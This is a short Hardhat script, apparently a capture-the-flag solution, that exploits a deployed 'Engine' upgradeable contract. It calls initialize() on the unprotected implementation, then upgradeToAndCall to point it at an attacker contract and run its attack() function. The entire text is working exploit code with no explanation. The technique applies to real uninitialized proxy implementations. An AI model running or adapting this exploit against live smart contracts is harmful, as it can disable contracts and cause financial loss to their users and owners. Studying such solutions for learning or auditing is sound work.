import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xb9f82fdd7707842a8406abd7f7823e4b0206c0c9";
const CONTRACT_NAME = "Engine";
const ATTACKER_NAME = "MotorbikeAttacker";

async function main() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const engine = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy();
  await attackerContract.deployed();

  let tx;
  tx = await engine.initialize();
  await tx.wait();

  const iface = new ethers.utils.Interface(["function attack()"]);
  const data = iface.encodeFunctionData("attack");

  tx = await engine.upgradeToAndCall(attackerContract.address, data);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
